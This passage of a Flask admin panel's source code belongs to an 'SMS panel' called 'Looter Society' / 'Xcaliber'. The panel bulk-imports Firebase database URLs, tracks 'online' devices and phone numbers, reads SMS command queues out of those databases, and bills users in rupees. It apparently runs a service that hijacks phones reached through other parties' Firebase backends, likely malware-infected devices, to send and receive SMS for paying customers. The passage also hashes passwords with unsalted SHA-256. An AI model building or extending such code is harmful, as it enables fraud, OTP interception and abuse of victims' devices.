.sidebar .logout a:hover{background:rgba(239,68,68,0.06)}

.main{margin-left:260px;flex:1;padding:32px 40px}

.main h1{font-size:24px;margin-bottom:28px;font-weight:800;color:var(--text)}

.main h1 .accent{color:var(--accent)}

.main h1 .gold{color:var(--gold)}

.stats-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(190px,1fr));gap:16px;margin-bottom:28px}

.stat-card{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:22px 18px;text-align:center;transition:all .25s;box-shadow:var(--shadow);position:relative;overflow:hidden}

.stat-card::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;border-radius:var(--radius) var(--radius) 0 0}

.stat-card:hover{transform:translateY(-4px);box-shadow:var(--shadow-lg)}

.stat-card .icon{width:44px;height:44px;border-radius:12px;display:inline-flex;align-items:center;justify-content:center;margin-bottom:10px;font-size:18px}

.stat-card .value{font-size:28px;font-weight:800;margin-bottom:2px}

.stat-card .label{font-size:12px;color:var(--muted);font-weight:500}

.stat-card.sblue::before{background:linear-gradient(90deg,var(--accent),var(--accent2))}

.stat-card.sblue .icon{background:rgba(14,165,233,0.1);color:var(--accent)}

.stat-card.sblue .value{color:var(--accent)}

.stat-card.sgold::before{background:linear-gradient(90deg,var(--gold),var(--gold2))}

.stat-card.sgold .icon{background:rgba(212,168,83,0.1);color:var(--gold)}

.stat-card.sgold .value{color:var(--gold)}

.stat-card.sgreen::before{background:linear-gradient(90deg,#22c55e,#4ade80)}

.stat-card.sgreen .icon{background:rgba(34,197,94,0.1);color:var(--green)}

.stat-card.sgreen .value{color:var(--green)}

.stat-card.sred::before{background:linear-gradient(90deg,#ef4444,#f87171)}

.stat-card.sred .icon{background:rgba(239,68,68,0.1);color:var(--red)}

.stat-card.sred .value{color:var(--red)}

.card{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);box-shadow:var(--shadow);margin-bottom:20px;overflow:hidden}

.card-header{padding:18px 24px;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center;background:linear-gradient(135deg,rgba(14,165,233,0.02),rgba(212,168,83,0.02))}

.card-header h2{font-size:16px;font-weight:700;display:flex;align-items:center;gap:8px}

.card-header h2 i{color:var(--accent)}

.card-body{padding:20px 24px}

table{width:100%;border-collapse:collapse}

th{padding:12px 16px;text-align:left;font-size:12px;color:var(--muted);font-weight:600;text-transform:uppercase;letter-spacing:0.5px;background:var(--input);border-bottom:1px solid var(--border)}

td{padding:12px 16px;border-bottom:1px solid var(--border);font-size:13px}

tr:last-child td{border-bottom:none}

tr:hover td{background:rgba(14,165,233,0.02)}

.badge{padding:5px 12px;border-radius:20px;font-size:11px;font-weight:600;display:inline-block}

.badge-green{background:rgba(34,197,94,0.1);color:#16a34a}

.badge-red{background:rgba(239,68,68,0.1);color:#dc2626}

.badge-blue{background:rgba(59,130,246,0.1);color:#2563eb}

.badge-yellow{background:rgba(234,179,8,0.1);color:#ca8a04}

.btn{padding:10px 22px;border-radius:var(--radius-xs);border:none;font-size:13px;font-weight:600;cursor:pointer;transition:all .2s;display:inline-flex;align-items:center;gap:7px;font-family:inherit}

.btn-accent{background:linear-gradient(135deg,var(--accent),var(--accent2));color:#fff;box-shadow:0 2px 8px rgba(14,165,233,0.3)}

.btn-accent:hover{transform:translateY(-2px);box-shadow:0 4px 16px rgba(14,165,233,0.4)}

.btn-gold{background:linear-gradient(135deg,var(--gold),#c4993f);color:#fff;box-shadow:0 2px 8px rgba(212,168,83,0.3)}

.btn-gold:hover{transform:translateY(-2px);box-shadow:0 4px 16px rgba(212,168,83,0.4)}

.btn-danger{background:linear-gradient(135deg,#ef4444,#dc2626);color:#fff}

.btn-outline{background:transparent;border:1px solid var(--border);color:var(--muted);border-radius:var(--radius-xs)}

.btn-outline:hover{border-color:var(--accent);color:var(--accent)}

.btn-sm{padding:6px 14px;font-size:12px;border-radius:var(--radius-xs)}

.input,.form-control{padding:11px 16px;background:var(--input);border:1.5px solid var(--input-border);border-radius:var(--radius-xs);color:var(--text);font-size:13px;outline:none;transition:all .2s;font-family:inherit;width:100%}

.input:focus,.form-control:focus{border-color:var(--accent);box-shadow:0 0 0 3px rgba(14,165,233,0.12);background:#fff}

textarea.input,textarea.form-control{resize:vertical;min-height:80px}

.form-row{display:flex;gap:14px;margin-bottom:18px;flex-wrap:wrap;align-items:end}

.form-group{display:flex;flex-direction:column;gap:6px}

.form-group label{font-size:12px;color:var(--muted);font-weight:600;text-transform:uppercase;letter-spacing:0.3px}

.flash{padding:14px 18px;border-radius:var(--radius-sm);margin-bottom:18px;font-size:13px;font-weight:500;display:flex;align-items:center;gap:8px}

.flash-success{background:rgba(34,197,94,0.08);color:#16a34a;border:1px solid rgba(34,197,94,0.2)}

.flash-error{background:rgba(239,68,68,0.08);color:#dc2626;border:1px solid rgba(239,68,68,0.2)}

.search-box{position:relative;margin-bottom:16px}

.search-box i{position:absolute;left:14px;top:50%;transform:translateY(-50%);color:var(--muted);font-size:14px}

.search-box input{padding-left:40px}

.cb-cell{width:40px;text-align:center}

.cb-cell input[type=checkbox]{width:16px;height:16px;accent-color:var(--accent);cursor:pointer}

.modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.4);display:none;align-items:center;justify-content:center;z-index:999;backdrop-filter:blur(4px)}

.modal-overlay.active{display:flex}

.modal{background:var(--card);border-radius:var(--radius);padding:28px;width:420px;max-width:95%;box-shadow:var(--shadow-lg)}

.modal h3{margin-bottom:20px;font-size:18px}

.modal-actions{display:flex;gap:10px;justify-content:flex-end;margin-top:20px}

.pagination{display:flex;gap:6px;justify-content:center;padding:20px;flex-wrap:wrap}

.pagination a,.pagination span{padding:8px 14px;border-radius:8px;font-size:13px;font-weight:500;text-decoration:none;transition:all .2s}

.pagination a{background:#f0f4f8;color:#1e293b}

.pagination a:hover{background:#0ea5e9;color:#fff}

.pagination .current{background:linear-gradient(135deg,#0ea5e9,#38bdf8);color:#fff;font-weight:600}

.pagination .disabled{color:#cbd5e1;pointer-events:none}

@media(max-width:768px){.sidebar{width:60px}.sidebar .brand h3,.sidebar .brand p,.sidebar nav a span,.sidebar .logout a span{display:none}.sidebar nav a{justify-content:center;padding:12px}.main{margin-left:60px;padding:20px}}

</style>

</head>

<body>

<div class="sidebar">

  <div class="brand">

    <div class="logo"><i class="fas fa-bolt"></i></div>

    <h3>Xcaliber</h3>

    <p>Admin Panel</p>

  </div>

  <nav>

    <a href="/dashboard" class="{{ 'active' if active=='dashboard' }}"><i class="fas fa-chart-line"></i> Dashboard</a>

    <a href="/databases" class="{{ 'active' if active=='databases' }}"><i class="fas fa-database"></i> Panels</a>

    <a href="/devices" class="{{ 'active' if active=='devices' }}"><i class="fas fa-mobile-alt"></i> Devices</a>

    <a href="/numbers" class="{{ 'active' if active=='numbers' }}"><i class="fas fa-phone"></i> Numbers</a>

    <a href="/online-numbers" class="{{ 'active' if active=='online_numbers' }}"><i class="fas fa-signal"></i> Online Numbers</a>

    <a href="/users" class="{{ 'active' if active=='users' }}"><i class="fas fa-users"></i> Users</a>

    <a href="/payments" class="{{ 'active' if active=='payments' }}"><i class="fas fa-rupee-sign"></i> Payments</a>

    <a href="/send-sms" class="{{ 'active' if active=='send_sms' }}"><i class="fas fa-paper-plane"></i> Send SMS</a>

    <a href="/received-sms" class="{{ 'active' if active=='received_sms' }}"><i class="fas fa-inbox"></i> Received SMS</a>

    <a href="/sms-logs" class="{{ 'active' if active=='sms_logs' }}"><i class="fas fa-comment-dots"></i> SMS Logs</a>

    <a href="/api-keys" class="{{ 'active' if active=='api_keys' }}"><i class="fas fa-key"></i> API Keys</a>

    <a href="/settings" class="{{ 'active' if active=='settings' }}"><i class="fas fa-cog"></i> Settings</a>

  </nav>

  <div class="logout"><a href="/logout"><i class="fas fa-sign-out-alt"></i> Logout</a></div>

</div>

<div class="main">

  {% with messages = get_flashed_messages(with_categories=true) %}

    {% for cat, msg in messages %}

      <div class="flash flash-{{ cat }}"><i class="fas {{ 'fa-check-circle' if cat=='success' else 'fa-exclamation-circle' }}"></i> {{ msg }}</div>

    {% endfor %}

  {% endwith %}

  {{ content|safe }}

</div>

<script>

function escapeHtml(s){var d=document.createElement('div');d.textContent=s;return d.innerHTML;}

function filterTable(searchId,tableId){var q=document.getElementById(searchId).value.toLowerCase();document.querySelectorAll('#'+tableId+' tbody tr').forEach(function(r){r.style.display=r.textContent.toLowerCase().includes(q)?'':'none';});}

</script>

</body>

</html>"""





def render_page(title, active, content):

    return render_template_string(LAYOUT, title=title, active=active, content=content)





# ─── Routes  ──────────────────────────────────────────────────────────────



@app.before_request
def restrict_admin_to_khaat():
    # Allow legitimate access to admin panel and web endpoints
    return





@app.after_request

def set_security_headers(response):

    response.headers["X-Content-Type-Options"] = "nosniff"

    response.headers["X-Frame-Options"] = "SAMEORIGIN"

    response.headers["X-XSS-Protection"] = "1; mode=block"

    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"

    if request.path.startswith("/api/"):

        response.headers["Cache-Control"] = "no-store, no-cache, must-revalidate"

    return response





@app.route("/login", methods=["GET", "POST"])

@app.route("/admin", methods=["GET", "POST"])

def login():

    client_ip = request.remote_addr

    if request.method == "POST":

        locked, remaining = _is_login_locked(client_ip)

        if locked:

            flash(f"Too many attempts. Try again in {remaining}s.", "error")

            return render_template_string(LOGIN_PAGE)

        username = request.form.get("username", "").strip()

        password = request.form.get("password", "").strip()

        user = admin_authenticate(username, password)

        if user:

            _login_attempts.pop(client_ip, None)

            session.permanent = True

            session["admin_logged"] = True

            session["admin_user"] = username

            return redirect(url_for("dashboard"))

        _record_login_attempt(client_ip)

        log.warning("Failed login attempt for user '%s' from %s", username, client_ip)

        flash("Invalid credentials", "error")

    return render_template_string(LOGIN_PAGE)





@app.route("/logout")

def logout():

    session.clear()

    return redirect(url_for("welcome"))





@app.route("/")

def welcome():

    host = request.host.split(":")[0]

    if host.startswith("khaat."):

        return redirect(url_for("login"))

    return """<!DOCTYPE html>

<html lang="en">

<head>

<meta charset="UTF-8">

<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Welcome to Looter Society</title>

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">

<style>

*{margin:0;padding:0;box-sizing:border-box}

body{font-family:'Segoe UI',system-ui,sans-serif;background:#0a0b10;color:#e2e8f0;min-height:100vh;overflow:hidden;position:relative}



.stars{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0}

.star{position:absolute;width:2px;height:2px;background:#fff;border-radius:50%;animation:twinkle 3s infinite alternate}

@keyframes twinkle{0%{opacity:0.2;transform:scale(1)}100%{opacity:1;transform:scale(1.5)}}



.particles{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;overflow:hidden}

.particle{position:absolute;border-radius:50%;animation:float linear infinite;opacity:0.15}

@keyframes float{0%{transform:translateY(100vh) rotate(0deg);opacity:0}10%{opacity:0.15}90%{opacity:0.15}100%{transform:translateY(-10vh) rotate(720deg);opacity:0}}



.container{position:relative;z-index:1;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;text-align:center;padding:20px}



.logo-icon{font-size:80px;background:linear-gradient(135deg,#6c5ce7,#a29bfe,#fd79a8);-webkit-background-clip:text;-webkit-text-fill-color:transparent;animation:pulse 2s ease-in-out infinite;margin-bottom:30px;filter:drop-shadow(0 0 30px rgba(108,92,231,0.5))}

@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.1)}}



h1{font-size:clamp(36px,6vw,72px);font-weight:900;background:linear-gradient(135deg,#6c5ce7,#a29bfe,#fd79a8,#fdcb6e);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:16px;line-height:1.1;letter-spacing:-2px}



.subtitle{font-size:clamp(16px,2.5vw,22px);color:#64748b;margin-bottom:50px;max-width:600px;line-height:1.6}



.features{display:flex;gap:30px;margin-bottom:50px;flex-wrap:wrap;justify-content:center;max-width:800px}

.feature{background:rgba(108,92,231,0.08);border:1px solid rgba(108,92,231,0.2);border-radius:16px;padding:24px 20px;width:180px;transition:all 0.3s}

.feature:hover{transform:translateY(-5px);border-color:#6c5ce7;box-shadow:0 10px 40px rgba(108,92,231,0.2)}

.feature i{font-size:28px;color:#a29bfe;margin-bottom:12px}

.feature h3{font-size:15px;margin-bottom:6px;color:#e2e8f0}

.feature p{font-size:12px;color:#64748b}



.btn-group{display:flex;gap:16px;flex-wrap:wrap;justify-content:center}

.btn{padding:16px 40px;border-radius:12px;font-size:16px;font-weight:700;text-decoration:none;transition:all 0.3s;cursor:pointer;border:none;display:inline-flex;align-items:center;gap:10px}

.btn-primary{background:linear-gradient(135deg,#6c5ce7,#a29bfe);color:#fff;box-shadow:0 4px 20px rgba(108,92,231,0.4)}

.btn-primary:hover{transform:translateY(-3px);box-shadow:0 8px 30px rgba(108,92,231,0.6)}

.btn-secondary{background:rgba(255,255,255,0.05);color:#e2e8f0;border:1px solid rgba(255,255,255,0.1)}

.btn-secondary:hover{background:rgba(255,255,255,0.1);transform:translateY(-3px)}



.footer{position:fixed;bottom:20px;color:#334155;font-size:13px;z-index:1}

</style>

</head>

<body>

<div class="particles" id="particles"></div>

<div class="stars" id="stars"></div>



<div class="container">

  <div class="logo-icon"><i class="fas fa-users-robbery"></i></div>

  <h1>Looter Society</h1>

  <p class="subtitle">The ultimate SMS panel powered by real-time device networks. Fast, reliable, and built for scale.</p>

  

  <div class="features">

    <div class="feature">

      <i class="fas fa-bolt"></i>

      <h3>Lightning Fast</h3>

      <p>0.1s delivery via real phone modems</p>

    </div>

    <div class="feature">

      <i class="fas fa-shield-halved"></i>

      <h3>100% Safe</h3>

      <p>Real SIM cards, not virtual</p>

    </div>

    <div class="feature">

      <i class="fas fa-globe"></i>

      <h3>100+ Panels</h3>

      <p>Massive network coverage</p>

    </div>

    <div class="feature">

      <i class="fas fa-headset"></i>

      <h3>24/7 Online</h3>

      <p>Always available devices</p>

    </div>

  </div>



  <div class="btn-group">

    <a href="/admin" class="btn btn-primary"><i class="fas fa-sign-in-alt"></i> Admin Panel</a>

    <a href="/dashboard" class="btn btn-secondary"><i class="fas fa-chart-line"></i> Dashboard</a>

  </div>

</div>



<div class="footer">Looter Society &copy; 2026 &mdash; Powered by Xcaliber</div>



<script>

// Stars

const stars=document.getElementById('stars');

for(let i=0;i<100;i++){const s=document.createElement('div');s.className='star';s.style.left=Math.random()*100+'%';s.style.top=Math.random()*100+'%';s.style.animationDelay=Math.random()*3+'s';s.style.animationDuration=(2+Math.random()*3)+'s';stars.appendChild(s)}



// Particles

const particles=document.getElementById('particles');

const colors=['#6c5ce7','#a29bfe','#fd79a8','#fdcb6e'];

for(let i=0;i<30;i++){const p=document.createElement('div');p.className='particle';const size=4+Math.random()*8;p.style.width=size+'px';p.style.height=size+'px';p.style.left=Math.random()*100+'%';p.style.background=colors[Math.floor(Math.random()*colors.length)];p.style.animationDuration=(10+Math.random()*20)+'s';p.style.animationDelay=Math.random()*10+'s';particles.appendChild(p)}

</script>

</body>

</html>"""





def index():

    if not session.get("admin_logged"):

        return redirect(url_for("login"))

    return redirect(url_for("dashboard"))





@app.route("/dashboard")

@login_required

def dashboard():

    total_panels = pg.execute_one("SELECT COUNT(*) as c FROM databases")

    total_panels = total_panels[0] if total_panels else 0

    active_panels = pg.execute_one("SELECT COUNT(*) as c FROM databases WHERE status = 'active'")

    active_panels = active_panels[0] if active_panels else 0

    inactive_panels = total_panels - active_panels



    working_panels = LIVE_CACHE.get("working_panels", 0) or PROBE_CACHE["results"]["panels"].get("working", 0)
    if not working_panels and active_panels > 0:
        working_panels = active_panels

    probe_time = LIVE_CACHE.get("last_update") or PROBE_CACHE.get("last_run")
    if probe_time:
        try:
            dt = datetime.fromisoformat(probe_time)
            probe_time = dt.strftime("%d %b %H:%M")
        except Exception:
            pass

    stats = {
        "users": usr_count(),
        "sms": log_total_sms(),
        "panels_total": total_panels,
        "panels_active": active_panels,
        "panels_working": working_panels,
        "devices_total": LIVE_CACHE.get("total_devices") or dv_count(),
        "devices_online": LIVE_CACHE.get("total_online") or dv_online_count(),
        "numbers_total": LIVE_CACHE.get("total_numbers") or nm_count(),
        "numbers_online": LIVE_CACHE.get("total_online_numbers") or nm_online_count(),
        "revenue": "%.2f" % pay_total(),
        "inactive_panels": inactive_panels,
        "probe_time": probe_time or "Live",
    }

    recent_logs = log_list(limit=10)

    recent_payments = pay_list()[:10]

    content = render_template_string(DASHBOARD_PAGE, stats=stats, recent_logs=recent_logs, recent_payments=recent_payments)

    return render_page("Dashboard", "dashboard", content)





@app.route("/databases", methods=["GET"])

@login_required

def databases_list():

    page = request.args.get("page", 1, type=int)

    search = request.args.get("q", "")

    per_page = 100

    panels = db_list_page(page, per_page, search)

    total = db_total_count(search)

    total_pages = max(1, -(-total // per_page))

    content = render_template_string(DATABASES_PAGE, panels=panels, total_panels=total, page=page, total_pages=total_pages, search=search)

    return render_page("Firebase Panels", "databases", content)





@app.route("/databases/add", methods=["POST"])

@login_required

def databases_add():

    url = request.form.get("url", "").strip()

    name = request.form.get("name", "").strip()

    if not url:

        flash("URL is required", "error")

        return redirect(url_for("databases_list"))

    normalized, derived_name = normalize_firebase_url(url)

    if not normalized:

        flash("Invalid Firebase URL. Must be *.firebaseio.com or *.firebasedatabase.app", "error")

        return redirect(url_for("databases_list"))

    if not name:

        name = derived_name

    existing = pg.execute_one("SELECT id FROM databases WHERE url = %s", (normalized,))

    if existing:

        flash("Panel with this URL already exists", "error")

        return redirect(url_for("databases_list"))

    db_add(normalized, name)

    flash(f"Panel added: {name}", "success")

    return redirect(url_for("databases_list"))





@app.route("/databases/bulk-add", methods=["POST"])

@login_required

def databases_bulk_add():

    bulk = request.form.get("bulk_urls", "").strip()

    if not bulk:

        flash("No URLs provided", "error")

        return redirect(url_for("databases_list"))



    lines = [l.strip() for l in bulk.splitlines() if l.strip()]

    added = 0

    skipped = 0

    invalid = 0

    for line in lines:

        normalized, name = normalize_firebase_url(line)

        if not normalized:

            invalid += 1

            continue

        existing = pg.execute_one("SELECT id FROM databases WHERE url = %s", (normalized,))

        if existing:

            skipped += 1

            continue

        db_add(normalized, name)

        added += 1



    msg = f"Added: {added}"

    if skipped:

        msg += f", Skipped (duplicates): {skipped}"

    if invalid:

        msg += f", Invalid URLs: {invalid}"

    if added > 0:

        flash(msg, "success")

    else:

        flash(msg, "error")



    return redirect(url_for("databases_list"))





@app.route("/databases/bulk-delete", methods=["POST"])

@login_required

def databases_bulk_delete():

    data = request.get_json(silent=True) or {}

    ids = data.get("ids", [])

    if not ids:

        return jsonify({"error": "No IDs provided"}), 400

    count = db_delete_many(ids)

    return jsonify({"ok": True, "deleted": count})





@app.route("/databases/toggle/<did>", methods=["POST"])

@login_required

def databases_toggle(did):

    result = db_toggle(did)

    if result:

        flash(f"Panel status set to {result}", "success")

    else:

        flash("Panel not found", "error")

    return redirect(url_for("databases_list"))





@app.route("/databases/delete/<did>", methods=["POST"])

@login_required

def databases_delete(did):

    db_delete(did)

    flash("Panel deleted", "success")

    return redirect(url_for("databases_list"))





@app.route("/databases/normalize", methods=["POST"])

@login_required

def databases_normalize():

    panels = pg.execute("SELECT id, url, name FROM databases", dict_cursor=True)

    fixed = 0

    removed = 0

    for p in panels:

        try:

            url = p["url"]

            normalized, name = normalize_firebase_url(url)

            if not normalized:

                pg.execute_write("DELETE FROM databases WHERE id = %s", (p["id"],))

                removed += 1

                continue

            if normalized != url:

                pg.execute_write("UPDATE databases SET url = %s, name = %s WHERE id = %s", (normalized, name or p["name"], p["id"]))

                fixed += 1

        except Exception as e:

            log.warning("Normalize error for %s: %s", p.get("id"), str(e)[:100])

            continue

    flash(f"Normalized: {fixed} URLs fixed, {removed} invalid URLs removed", "success")

    return redirect(url_for("databases_list"))





@app.route("/devices", methods=["GET"])

@login_required

def devices_list():

    page = request.args.get("page", 1, type=int)

    search = request.args.get("q", "")

    per_page = 100

    devices = dv_list_page(page, per_page, search)

    total = dv_count()

    total_pages = max(1, -(-total // per_page))

    probe_time = PROBE_CACHE.get("last_run")

    if probe_time:

        try:

            dt = datetime.fromisoformat(probe_time)

            probe_time = dt.strftime("%d %b %H:%M")

        except Exception:

            pass

    content = render_template_string(DEVICES_PAGE, devices=devices, probe_time=probe_time, total_devices=total, page=page, total_pages=total_pages, search=search)

    return render_page("Devices", "devices", content)





@app.route("/devices/add", methods=["POST"])

@login_required

def devices_add():

    device_id = request.form.get("device_id", "").strip()

    info = request.form.get("info", "").strip()

    if device_id:

        dv_add(device_id, info)

        flash("Device added", "success")

    else:

        flash("Device ID is required", "error")

    return redirect(url_for("devices_list"))





@app.route("/devices/delete/<did>", methods=["POST"])

@login_required

def devices_delete(did):

    dv_delete(did)

    flash("Device removed", "success")

    return redirect(url_for("devices_list"))





@app.route("/numbers", methods=["GET"])

@login_required

def numbers_list():

    page = request.args.get("page", 1, type=int)

    search = request.args.get("q", "")

    per_page = 100

    numbers = nm_list_page(page, per_page, search)

    total = nm_count()

    total_pages = max(1, -(-total // per_page))

    probe_time = PROBE_CACHE.get("last_run")

    if probe_time:

        try:

            dt = datetime.fromisoformat(probe_time)

            probe_time = dt.strftime("%d %b %H:%M")

        except Exception:

            pass

    content = render_template_string(NUMBERS_PAGE, numbers=numbers, probe_time=probe_time, total_numbers=total, page=page, total_pages=total_pages, search=search)

    return render_page("Numbers", "numbers", content)





@app.route("/online-numbers", methods=["GET"])

@login_required

def online_numbers():

    all_devices = LIVE_CACHE.get("online_devices", [])

    devices = [d for d in all_devices if d.get("is_online")]

    total = LIVE_CACHE.get("total_online", 0)

    last_update = LIVE_CACHE.get("last_update", "Never")

    probe_running = LIVE_CACHE.get("probe_running", False)

    if last_update and last_update != "Never":

        try:

            dt = datetime.fromisoformat(last_update)

            last_update = dt.strftime("%d %b %H:%M:%S")

        except Exception:

            pass

    content = render_template_string(ONLINE_NUMBERS_PAGE, devices=devices, total=total, last_update=last_update, probe_running=probe_running)

    return render_page("Online Numbers", "online_numbers", content)





@app.route("/firebase-sms-history/<panel_name>", methods=["GET"])

@login_required

def firebase_sms_history(panel_name):

    panel = pg.execute_one("SELECT * FROM databases WHERE name = %s", (panel_name,), dict_cursor=True)

    if not panel:

        flash("Panel not found", "error")

        return redirect(url_for("online_numbers"))

    url = panel["url"]

    sms_data = []

    clients = _httpx_fetch_sync(url, "clients")

    if clients and isinstance(clients, dict):

        for cid, cdata in clients.items():

            if not isinstance(cdata, dict):

                continue

            for subkey in ("action", "sms", "smsCommand", "send_sms"):

                sub = cdata.get(subkey)

                if isinstance(sub, dict):

                    sms_data.append({

                        "device": cid[:16],

                        "type": subkey,

                        "to": sub.get("to") or sub.get("number") or sub.get("phone") or "",

                        "message": (sub.get("message") or sub.get("messageText") or sub.get("msg") or "")[:100],

                        "status": sub.get("status") or ("sent" if sub.get("isSended") else "pending"),

                        "timestamp": sub.get("timestamp", ""),

                    })

                elif isinstance(sub, list):

                    for item in sub[-5:]:

                        if isinstance(item, dict):

                            sms_data.append({

                                "device": cid[:16],

                                "type": subkey,

                                "to": item.get("to") or item.get("number") or "",

                                "message": (item.get("message") or item.get("msg") or "")[:100],

                                "status": item.get("status", ""),

                                "timestamp": item.get("timestamp", ""),

                            })

    sms_data.sort(key=lambda x: str(x.get("timestamp", "")), reverse=True)

    content = render_template_string(FIREBASE_SMS_HISTORY, sms_data=sms_data[:50], panel_name=panel_name, panel_url=url)

    return render_page(f"SMS History - {panel_name}", "online_numbers", content)





@app.route("/numbers/add", methods=["POST"])

@login_required

def numbers_add():

    number = request.form.get("number", "").strip()

    info = request.form.get("info", "").strip()

    if number:

        nm_add(number, info)

        flash("Number added", "success")

    else:

        flash("Number is required", "error")

    return redirect(url_for("numbers_list"))





@app.route("/numbers/delete/<number>", methods=["POST"])

@login_required

def numbers_delete(number):

    nm_delete(number)

    flash("Number removed", "success")

    return redirect(url_for("numbers_list"))





@app.route("/users", methods=["GET"])

@login_required

def users_list():

    page = request.args.get("page", 1, type=int)

    search = request.args.get("q", "")

    per_page = 100

    users = usr_list_page(page, per_page, search)

    total = usr_total_count(search)

    total_pages = max(1, -(-total // per_page))

    content = render_template_string(USERS_PAGE, users=users, total_users=total, page=page, total_pages=total_pages, search=search)

    return render_page("Users", "users", content)





@app.route("/users/add-balance", methods=["POST"])

@login_required

def users_add_balance():

    uid = request.form.get("user_id", "").strip()

    amount = request.form.get("amount", 0, type=float)

    if uid and amount > 0:

        usr_add_balance(uid, amount)

        flash(f"Added ₹{amount:.2f} to {uid}", "success")

    else:

        flash("Invalid input", "error")

    return redirect(url_for("users_list"))





@app.route("/users/deduct-balance", methods=["POST"])

@login_required

def users_deduct_balance():

    uid = request.form.get("user_id", "").strip()

    amount = request.form.get("amount", 0, type=float)

    if uid and amount > 0:

        result = usr_deduct_balance(uid, amount)

        if result:

            flash(f"Deducted ₹{amount:.2f} from {uid}", "success")

        else:

            flash("Insufficient balance or user not found", "error")

    else:

        flash("Invalid input", "error")

    return redirect(url_for("users_list"))





@app.route("/payments")

@login_required

def payments_list():

    page = request.args.get("page", 1, type=int)

    search = request.args.get("q", "")

    per_page = 100

    payments = pay_list_page(page, per_page, search)

    total = pay_total()

    total_pages = max(1, -(-total // per_page))

    content = render_template_string(PAYMENTS_PAGE, payments=payments, total=total, page=page, total_pages=total_pages, search=search)

    return render_page("Payments", "payments", content)





@app.route("/verify", methods=["GET", "POST"])

@login_required

def verify_utr():

    result = None

    found = False

    utr = ""

    if request.method == "POST":

        utr = request.form.get("utr", "").strip()

        if utr:

            result = pay_get(utr)

            found = result is not None

    content = render_template_string(VERIFY_PAGE, result=result, found=found, utr=utr)

    return render_page("Verify UTR", "verify", content)





@app.route("/sms-logs")

@login_required

def sms_logs_page():

    page = request.args.get("page", 1, type=int)

    search = request.args.get("q", "")

    per_page = 100

    logs = log_list_page(page, per_page, search)

    total = log_count()

    total_pages = max(1, -(-total // per_page))

    content = render_template_string(SMS_LOGS_PAGE, logs=logs, total_logs=total, page=page, total_pages=total_pages, search=search)

    return render_page("SMS Logs", "sms_logs", content)





@app.route("/api-keys")

@login_required

def api_keys_page():

    page = request.args.get("page", 1, type=int)

    search = request.args.get("q", "")

    per_page = 100

    keys = apikey_list_page(page, per_page, search)

    total = apikey_count()

    total_pages = max(1, -(-total // per_page))

    content = render_template_string(API_KEYS_PAGE, keys=keys, page=page, total_pages=total_pages, search=search)

    return render_page("API Keys", "api_keys", content)





@app.route("/api-keys/add", methods=["POST"])

@login_required

def api_keys_add():

    user_id = request.form.get("user_id", "").strip()

    name = request.form.get("name", "").strip()

    if user_id and name:

        key = apikey_add(user_id, name)

        flash(f"API Key created: {key}", "success")

    else:

        flash("User ID and Name are required", "error")

    return redirect(url_for("api_keys_page"))





@app.route("/api-keys/delete/<key>", methods=["POST"])

@login_required

def api_keys_delete(key):

    apikey_delete(key)

    flash("API Key deleted", "success")

    return redirect(url_for("api_keys_page"))





@app.route("/settings/change-password", methods=["POST"])

@login_required

def change_password():

    current = request.form.get("current_password", "")

    new_pass = request.form.get("new_password", "")

    confirm = request.form.get("confirm_password", "")

    if not current or not new_pass or not confirm:

        flash("pw|error|All fields are required", "pw")

        return redirect(url_for("settings_page"))

    if new_pass != confirm:

        flash("pw|error|New passwords do not match", "pw")

        return redirect(url_for("settings_page"))

    if len(new_pass) < 6:

        flash("pw|error|Password must be at least 6 characters", "pw")

        return redirect(url_for("settings_page"))

    admin_user = session.get("admin_user", "admin")

    h_current = hashlib.sha256(current.encode()).hexdigest()

    row = pg.execute_one("SELECT id FROM admin WHERE username = %s AND password = %s", (admin_user, h_current))

    if not row:

        flash("pw|error|Current password is incorrect", "pw")

        return redirect(url_for("settings_page"))

    h_new = hashlib.sha256(new_pass.encode()).hexdigest()

    pg.execute_write("UPDATE admin SET password = %s WHERE username = %s", (h_new, admin_user))

    flash("pw|success|Password changed successfully!", "pw")

    return redirect(url_for("settings_page"))





@app.route("/settings/save-bot-fields", methods=["POST"])

@login_required

def save_bot_fields():

    data = request.get_json(silent=True) or {}

    for k in ["name", "description", "short_description", "about", "commands"]:

        v = data.get(k, "")

        db_key = f"bot_{k}" if k != "name" else "bot_name"

        if k == "name":

            db_key = "bot_name"

        elif k == "description":

            db_key = "bot_description"

        elif k == "short_description":

            db_key = "bot_short_description"

        elif k == "about":

            db_key = "bot_about"

        elif k == "commands":

            db_key = "bot_commands"

        setting_set(db_key, v)

    return jsonify({"ok": True})





@app.route("/settings/apply-photo", methods=["POST"])

@login_required

def apply_bot_photo():

    token = setting_get("bot_token") or BOT_TOKEN

    if not token:

        return jsonify({"ok": False, "error": "No bot token configured"}), 400

    photo = request.files.get("photo")

    if not photo:

        return jsonify({"ok": False, "error": "No photo uploaded"}), 400

    import io

    photo_bytes = photo.read()

    if len(photo_bytes) > 5 * 1024 * 1024:

        return jsonify({"ok": False, "error": "Photo too large (max 5MB)"}), 400

    try:

        import urllib.request

        boundary = "----FormBoundary" + str(hash(photo.filename))

        body = b""

        body += f"--{boundary}\r\n".encode()

        body += f'Content-Disposition: form-data; name="photo"; filename="{photo.filename}"\r\n'.encode()

        body += f"Content-Type: {photo.content_type}\r\n\r\n".encode()

        body += photo_bytes

        body += f"\r\n--{boundary}--\r\n".encode()

        req = urllib.request.Request(

            f"https://api.telegram.org/bot{token}/setMyPhoto",

            data=body,

            headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},

        )

        urllib.request.urlopen(req, timeout=30)

        return jsonify({"ok": True})

    except Exception as e:

        return jsonify({"ok": False, "error": str(e)[:200]})










@app.route("/settings/save-and-restart", methods=["POST"])

@login_required

def save_and_restart_bot():

    global BOT_TOKEN

    new_token = request.form.get("bot_token", "").strip()

    if new_token:

